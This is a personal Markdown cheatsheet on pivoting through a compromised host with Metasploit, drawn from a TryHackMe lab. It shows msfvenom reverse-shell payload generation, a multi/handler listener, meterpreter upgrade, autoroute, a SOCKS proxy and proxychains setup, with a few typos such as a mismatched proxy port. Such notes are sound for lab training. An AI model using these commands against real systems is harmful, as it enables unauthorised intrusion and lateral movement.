
# Pivoting and Proxying with Metasploit

## Introduction

Pivoting is when an attacker gains foothold on the compromised machine, which then need to be  used to send additional web traffic through to allow previously inaccessible machines to be reached, pivoting though the machine to other in the internal networking. Consider reading [[Port-Redirection-And-Tunneling]], [[Lateral-Movement]], [[Proxies]] and [[Evading-Firewalls]].

Terms used are like many in cyebr security some what interchangable, I personally am looking for to the standardisation that will occur  

### Setup

Get regular or meterpreter shell on target:
```bash
msfvenom -p windows/x64/$SHELL/reverse_tcp -f exe -o shell.exe LHOST=$IP LPORT=$LPORT
```

Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```ruby
use multi/handler
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```

For convert shell to meterpreter
```ruby
sessions -u -1 # -1 is the sessions number
```

### Auto-Routing our Traffic

```ruby
use post/multi/manage/autoroute
set SESSION 1
set netmask /CIDR
set subnet $IP
exploit
```

Configuration, [reference](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
```ruby
route # display the active routes
route add <IP ADDRESS OF SUBNET> <NETMASK> <GATEWAY
	  remove
	  flush	# remove all routes from routing table
```

To change the autoroute from one route to another
```ruby
route remove IP/CIDR SESSIONID
route add IP/CIDR SESSIONID
route get
```

## Setting up Proxy with Metasploit

Note: Depending on what version of Metasploit you are using, the Proxy Server module will be different. 
MSF5 and lower will have auxiliary/server/socks4a or socks5, MSF6 and newer will have socks/auxiliary/socks\_proxy. 
With MSF6, you will need to specify if you want to use SOCKS4(a) or SOCKS5.
```ruby
use auxiliary/server/socks4a
# msf6 !!
use auxiliary/server/socks_proxy 
run srvhost=127.0.0.1 srvport=9050 version=4a
curl --proxy socks4a://localhost:950 http://$target_ip
```
Configure proxychains
```bash
vim /etc/proxychains.conf
# comment lines that aren't required or you'll create a longer misconfigured chain
socks$4-5 127.0.0.1 $AUXILIARY-SERVER-PORT-NUMBER-GOES-HERE
```


## References

[THM Alh4r3d's Pivoting with Metasploit day 9 for AoC 4](https://tryhackme.com/room/adventofcyber4#)